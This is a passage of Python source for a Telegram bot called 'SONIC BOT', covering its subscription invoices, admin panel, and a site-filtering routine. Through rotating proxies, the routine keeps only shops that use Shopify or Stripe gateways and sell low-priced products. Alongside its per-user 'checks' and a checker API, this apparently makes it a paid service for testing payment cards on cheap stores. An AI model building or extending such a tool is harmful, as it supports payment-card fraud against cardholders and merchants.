            prices = [LabeledPrice(label=plan['name'], amount=plan['stars'])]
            payload = f"sub_{plan_key}"
            bot.send_invoice(
                chat_id=user_id,
                title=title,
                description=description,
                invoice_payload=payload,
                provider_token="",
                currency="XTR",
                prices=prices,
                start_parameter="subscription"
            )
            bot.answer_callback_query(call.id)
    
    elif data == "admin_stats" and is_admin(user_id):
        users = get_all_users()
        total_users = len(users)
        premium_users = len([u for u in users.values() if u.get('premium', False)])
        blocked_users = len([u for u in users.values() if u.get('blocked', False)])
        total_checks = sum(u.get('total_checks', 0) for u in users.values())
        stats_text = f"""<b>📊 Bot Statistics</b>

├ 👥 Total Users: {total_users}
├ ⭐ Premium Users: {premium_users}
├ 🚫 Blocked Users: {blocked_users}
├ 📈 Total Checks: {total_checks}
└ ⏱️ Last Update: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"""
        bot.edit_message_text(stats_text, chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=get_admin_menu_keyboard(), parse_mode='HTML')
        bot.answer_callback_query(call.id)
    
    elif data == "admin_sites" and is_admin(user_id):
        bot.edit_message_text("🌐 <b>Site Management</b>\n\nChoose an option:", chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=get_admin_sites_menu(), parse_mode='HTML')
        bot.answer_callback_query(call.id)
    
    elif data == "admin_panel" and is_admin(user_id):
        stats_text = """<b>👑 Admin Control Panel</b>

Use buttons below or direct commands:

├ <code>/gencode number</code> - Generate activation code
├ <code>/block user_id</code> - Block user
├ <code>/unblock user_id</code> - Unblock user
├ <code>/broadcast message</code> - Broadcast message
├ <code>/setlimit user_id number</code> - Set user limit
├ <code>/users</code> - List all users
├ <code>/user user_id</code> - Show user details
└ <code>/stats</code> - Bot statistics"""
        bot.edit_message_text(stats_text, chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=get_admin_menu_keyboard(), parse_mode='HTML')
        bot.answer_callback_query(call.id)
    
    elif data == "admin_view_sites" and is_admin(user_id):
        sites = load_admin_sites()
        if not sites:
            bot.edit_message_text("📋 <b>No sites found.</b>\n\nUse /addsites or /site to add sites.", chat_id=call.message.chat.id, message_id=call.message.message_id, parse_mode='HTML')
        else:
            sites_text = "\n".join([f"• {site}" for site in sites])
            bot.edit_message_text(f"📋 <b>Sites ({len(sites)}):</b>\n\n{sites_text}", chat_id=call.message.chat.id, message_id=call.message.message_id, parse_mode='HTML')
        bot.answer_callback_query(call.id)
    
    elif data == "admin_add_site" and is_admin(user_id):
        bot.edit_message_text("➕ <b>Add a site</b>\n\nSend the site domain.\nExample: <code>example.com</code>", chat_id=call.message.chat.id, message_id=call.message.message_id, parse_mode='HTML')
        bot.answer_callback_query(call.id)
    
    elif data == "admin_remove_site" and is_admin(user_id):
        sites = load_admin_sites()
        if not sites:
            bot.edit_message_text("📋 <b>No sites to remove.</b>", chat_id=call.message.chat.id, message_id=call.message.message_id, parse_mode='HTML')
        else:
            sites_text = "\n".join([f"{i+1}. {site}" for i, site in enumerate(sites)])
            bot.edit_message_text(f"🗑️ <b>Remove a site</b>\n\nSend the site domain or number.\n\nCurrent sites:\n{sites_text}", chat_id=call.message.chat.id, message_id=call.message.message_id, parse_mode='HTML')
        bot.answer_callback_query(call.id)
    
    elif data == "admin_check_sites" and is_admin(user_id):
        bot.edit_message_text("💰 <b>Select price range to filter sites:</b>\n\nSites will be filtered by their cheapest product price.", chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=get_price_filter_keyboard(), parse_mode='HTML')
        bot.answer_callback_query(call.id)
    
    elif data == "admin_upload_sites" and is_admin(user_id):
        bot.edit_message_text("📁 <b>Upload sites file</b>\n\nSend a .txt file containing sites (one per line).\n\nYou will be asked to select a price filter after uploading.", chat_id=call.message.chat.id, message_id=call.message.message_id, parse_mode='HTML')
        bot.answer_callback_query(call.id)
    
    elif data == "admin_clear_sites" and is_admin(user_id):
        save_admin_sites([])
        bot.edit_message_text("✅ <b>All sites have been cleared!</b>", chat_id=call.message.chat.id, message_id=call.message.message_id, parse_mode='HTML')
        bot.answer_callback_query(call.id)
    
    elif data == "admin_cancel" and is_admin(user_id):
        if user_id in user_pending_sites:
            del user_pending_sites[user_id]
        bot.edit_message_text("❌ Operation cancelled.", chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=get_admin_menu_keyboard(), parse_mode='HTML')
        bot.answer_callback_query(call.id)
    
    elif data.startswith("price_"):
        if user_id in user_pending_sites:
            pending = user_pending_sites.pop(user_id)
            action = pending['action']
            sites = pending['sites']
            price_key = data.split("_")[1]
            price_ranges = {
                "1": {"name": "1$ - 10$", "min": 1, "max": 10},
                "2": {"name": "5$ - 20$", "min": 5, "max": 20},
                "3": {"name": "10$ - 30$", "min": 10, "max": 30},
                "4": {"name": "No filter", "min": 0, "max": 999999}
            }
            price_range = price_ranges.get(price_key, price_ranges["4"])
            bot.edit_message_text(f"🔄 Processing {len(sites)} sites...\nPrice filter: {price_range['name']}", chat_id=call.message.chat.id, message_id=call.message.message_id, parse_mode='HTML')
            proxies = load_user_proxies(user_id)
            if not proxies:
                bot.edit_message_text("❌ No proxies available.", chat_id=call.message.chat.id, message_id=call.message.message_id, parse_mode='HTML')
                bot.answer_callback_query(call.id)
                return
            proxy = random.choice(proxies)
            filtered_sites = []
            total = len(sites)
            for i, site in enumerate(sites):
                gateway = get_site_gateway(site, proxy)
                if not gateway or not any(allowed in gateway for allowed in ALLOWED_GATEWAYS):
                    continue
                if price_range["min"] > 0 or price_range["max"] < 999999:
                    min_price = get_site_min_price(site)
                    if min_price is None or min_price <= price_range["max"]:
                        filtered_sites.append(site)
                else:
                    filtered_sites.append(site)
                if (i + 1) % 10 == 0:
                    bot.edit_message_text(f"🔄 Progress: {i+1}/{total}\nValid sites: {len(filtered_sites)}", chat_id=call.message.chat.id, message_id=call.message.message_id, parse_mode='HTML')
            if action == 'check':
                save_admin_sites(filtered_sites)
                result_text = f"""✅ <b>Site Check Complete!</b>

📊 <b>Summary:</b>
├ Total sites before: {len(sites)}
├ Sites after filter: {len(filtered_sites)}
├ Removed: {len(sites) - len(filtered_sites)}

💰 <b>Filter applied:</b> {price_range['name']}
🔌 <b>Gateway filter:</b> Shopify/Stripe only

Sites have been updated with only working sites."""
            else:
                current_sites = load_admin_sites()
                new_sites = [s for s in filtered_sites if s not in current_sites]
                all_sites = list(set(current_sites + filtered_sites))
                save_admin_sites(all_sites)
                result_text = f"""✅ <b>Sites Added with Filters!</b>

📊 <b>Summary:</b>
├ Total sites in file: {len(sites)}
├ Valid sites (Shopify/Stripe): {len(filtered_sites)}
├ New sites added: {len(new_sites)}
└ Total sites now: {len(all_sites)}

💰 <b>Filter applied:</b> {price_range['name']}
🔌 <b>Gateway filter:</b> Shopify/Stripe only

Use /sitecheck to verify all sites are working."""
            bot.edit_message_text(result_text, chat_id=call.message.chat.id, message_id=call.message.message_id, parse_mode='HTML')
            bot.answer_callback_query(call.id)
    
    elif data in ["admin_broadcast", "admin_block", "admin_unblock", "admin_set_limit"] and is_admin(user_id):
        bot.edit_message_text("Please use the command directly.\nExample: /broadcast message", chat_id=call.message.chat.id, message_id=call.message.message_id, parse_mode='HTML')
        bot.answer_callback_query(call.id)
    
    else:
        bot.answer_callback_query(call.id)

# ==================== تشغيل البوت ====================
if __name__ == "__main__":
    print("=" * 50)
    print("✅ SONIC BOT started successfully!")
    print("⚡ SONIC BOT (Telebot Version)")
    print(f"📡 API URL: {CHECKER_API_URL}")
    print("=" * 50)
    while True:
        try:
            bot.polling(none_stop=True, interval=0, timeout=20)
        except Exception as e:
            print(f"Error: {e}")
            time.sleep(5)
